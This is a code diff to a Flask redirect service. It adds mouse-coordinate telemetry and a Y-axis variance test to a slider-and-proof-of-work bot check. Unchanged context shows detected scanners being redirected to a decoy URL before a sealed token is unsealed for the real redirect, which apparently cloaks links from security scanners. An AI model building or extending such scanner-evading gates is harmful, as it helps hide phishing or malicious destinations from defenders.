@@ -156,7 +156,7 @@ def _static_page(title: str, text: str, status_code: int):
     return make_response(html, status_code)
 
 # ---------------------------------------------------------------------------
-# LANDING PAGE (With PoW and Telemetry)
+# LANDING PAGE (With PoW, Telemetry, and Mouse Coordinates)
 # ---------------------------------------------------------------------------
 LANDING = """<!DOCTYPE html>
 <html lang="en">
@@ -197,6 +197,7 @@ LANDING = """<!DOCTYPE html>
             <input type="hidden" name="pow_nonce" id="pow_nonce" value="">
             <input type="hidden" name="drag_time" id="drag_time" value="0">
             <input type="hidden" name="drag_events" id="drag_events" value="0">
+            <input type="hidden" name="mouse_coords" id="mouse_coords" value="[]">
         </form>
     </div>
     <script>
@@ -212,6 +213,7 @@ LANDING = """<!DOCTYPE html>
         let maxDelta = 0;
         let dragStartTime = 0;
         let dragEvents = 0;
+        let coordinates = []; 
 
         function init() { maxDelta = container.offsetWidth - handle.offsetWidth - 10; }
         window.onload = init; window.onresize = init;
@@ -227,6 +229,7 @@ LANDING = """<!DOCTYPE html>
             isDragging = true; 
             dragStartTime = Date.now();
             dragEvents = 0;
+            coordinates = []; 
             startX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX; 
         }
 
@@ -236,6 +239,10 @@ LANDING = """<!DOCTYPE html>
             dragEvents++;
             
             const clientX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
+            const clientY = e.type.includes('mouse') ? e.clientY : e.touches[0].clientY;
+            
+            coordinates.push({x: clientX, y: clientY});
+            
             let deltaX = clientX - startX;
             if (deltaX < 0) deltaX = 0; if (deltaX > maxDelta) deltaX = maxDelta;
             
@@ -259,7 +266,6 @@ LANDING = """<!DOCTYPE html>
             
             const dragDuration = Date.now() - dragStartTime;
             
-            // Bot check: Reject if drag was too fast or had too few events
             if (dragDuration < 200 || dragEvents < 5) {
                 document.getElementById("slider-text").innerText = "Automation detected. Try again.";
                 handle.style.left = '5px';
@@ -271,7 +277,6 @@ LANDING = """<!DOCTYPE html>
             handle.innerHTML = '<svg style="fill:white" viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>';
             handle.style.cursor = 'default'; text.style.opacity = '0'; successText.style.display = 'block';
 
-            // Proof of Work (PoW)
             const seed = "{{ challenge }}";
             let nonce = 0;
             let hash = "";
@@ -283,10 +288,10 @@ LANDING = """<!DOCTYPE html>
                 hash = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
             }
 
-            // Populate form and submit
             document.getElementById("pow_nonce").value = nonce;
             document.getElementById("drag_time").value = dragDuration;
             document.getElementById("drag_events").value = dragEvents;
+            document.getElementById("mouse_coords").value = JSON.stringify(coordinates);
             
             form.submit();
         }
@@ -324,7 +329,6 @@ def landing(token: str):
         log.info(json.dumps({"event": "landing_scanner_redirect", **tag, "to": unwanted}))
         return redirect(unwanted, code=302)
 
-    # Generate a fresh challenge seed for this specific request
     challenge_seed = secrets.token_hex(16)
     
     nonce_payload = {"t": eop_token, "ts": time.time(), "challenge": challenge_seed}
@@ -373,12 +377,29 @@ def execute(token: str):
     if not test_hash.startswith("0000"):
         return _static_page("Verification Failed", "Invalid PoW.", 400)
 
-    # 2. Check Telemetry
+    # 2. Check Telemetry & Mouse Variance
     drag_time = int(request.form.get("drag_time", 0))
     drag_events = int(request.form.get("drag_events", 0))
+    coords_json = request.form.get("mouse_coords", "[]")
 
     if drag_time < 200 or drag_events < 5:
         return _static_page("Verification Failed", "Automated behavior detected.", 400)
+
+    try:
+        coords = json.loads(coords_json)
+        if len(coords) > 1:
+            # Calculate Y-axis variance (human hand shakes vertically while dragging horizontally)
+            y_values = [c['y'] for c in coords]
+            mean_y = sum(y_values) / len(y_values)
+            variance_y = sum((y - mean_y) ** 2 for y in y_values) / len(y_values)
+            
+            # If variance is exactly 0, it was a perfectly straight line (bot)
+            if variance_y == 0:
+                return _static_page("Verification Failed", "Linear movement detected.", 400)
+        else:
+            return _static_page("Verification Failed", "Not enough movement data.", 400)
+    except Exception:
+        return _static_page("Verification Failed", "Malformed telemetry data.", 400)
 
     # If all checks pass, execute redirect
     data = unseal_payload(token)
